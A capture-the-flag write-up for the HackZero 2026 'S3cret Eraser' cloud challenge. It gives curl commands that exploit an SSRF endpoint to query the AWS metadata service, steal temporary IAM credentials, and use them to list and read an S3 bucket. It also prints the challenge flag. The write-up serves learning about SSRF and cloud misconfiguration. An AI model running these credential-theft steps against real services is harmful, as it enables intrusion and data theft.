# S3cret Eraser

| Field      | Value |
|------------|-------|
| Category   | Cloud Security |
| Points     | 250 |
| Solves     | 41 |

## Description

The real artifact isn’t the image.

Flag Format:
`hackzero{}`

**Challenge URL**: https://removebg.vitbctf.dev

## Writeup

> ```Flag:```  `hackzero{14a1f61b47251e394accb4e580e00b77}`

## Challenge Information
- **CTF Name:** HackZero 2026
- **Challenge Name:** S3cret Eraser
- **Category:** Cloud Security
- **Points:** 250
- **Author:** @pphreak_1001
- **Solved By:** ret2.libc



The hint was..

> “The real artifact isn’t the image.”

ig this was a very nice misdirection challenge.

## 1) First look at the web app
I opened the challenge:

```bash
curl -s https://removebg.vitbctf.dev/ | head -n 40
```

Then I checked JavaScript:

```bash
curl -s https://removebg.vitbctf.dev/script.js
```

Then I analysed script.js, I saw 2 backend endpoints:

- `/upload`
- `/fetch`

`/fetch` takes JSON body with a URL.
So I suspected SSRF i.e., Server-Side Request Forgery, which means I can make server fetch internal URLs for me.

## 2) Confirm SSRF + response leak
I tested `/fetch` with localhost:

```bash
curl -s -X POST https://removebg.vitbctf.dev/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://127.0.0.1"}' | jq
```

I got response like...

```text
success: false
error: "Fetched content is not an image."
content: "<!DOCTYPE html>..."
```

This is huge.
i.e., even when fetch “fails image check”, server still returns fetched body inside content.

Author cooked this well. It was really nice one.

## 3) Browsed cloud metadata (IMDS)
Now I targeted AWS metadata IP:

```bash
curl -s -X POST https://removebg.vitbctf.dev/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/"}' | jq -r .content
```

I got metadata paths.
This confirms SSRF can reach IMDS i.e., Instance Metadata Service, which means EC2 internal metadata.

Then IAM role name:

```bash
curl -s -X POST https://removebg.vitbctf.dev/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/"}' | jq -r .content
```

It returned role name:

`bg-remove-all`

Then I fetched credentials:

```bash
curl -s -X POST https://removebg.vitbctf.dev/fetch \
  -H 'Content-Type: application/json' \
  -d '{"url":"http://169.254.169.254/latest/meta-data/iam/security-credentials/bg-remove-all"}' | jq -r .content
```

I got temporary AWS keys:

- AccessKeyId
- SecretAccessKey
- Token

This is IAM creds i.e., Identity and Access Management temporary credentials.

## 4) Use creds to access S3
I exported the creds:

```bash
export AWS_ACCESS_KEY_ID='PASTE_ACCESS_KEY_ID'
export AWS_SECRET_ACCESS_KEY='PASTE_SECRET_ACCESS_KEY'
export AWS_SESSION_TOKEN='PASTE_TOKEN'
export AWS_DEFAULT_REGION='ap-south-1'
```

Then I listed bucket objects:

```bash
aws s3api list-objects-v2 --bucket bg-remove-ctf-93f2a8 \
  --query 'Contents[].Key' --output text
```

I found hidden path:

`supersecret/flag.txt`

Again, very nice author touch, i.e., “real artifact isn’t image” was literal.

Then I read it:

```bash
aws s3 cp s3://bg-remove-ctf-93f2a8/supersecret/flag.txt -
```

Flag:

`hackzero{14a1f61b47251e394accb4e580e00b77}`


## Analysis

- The endpt `/fetch` had SSRF.
- It returned fetched body in JSON even on non-image, i.e., information leak.
- Then the SSRF reached AWS IMDS.
- And IMDS gave IAM temporary creds.
- With, IAM creds allowed S3 object listing in that bucket.
- The Hidden non-image artifact had the flag.

## Author

ret2.libc
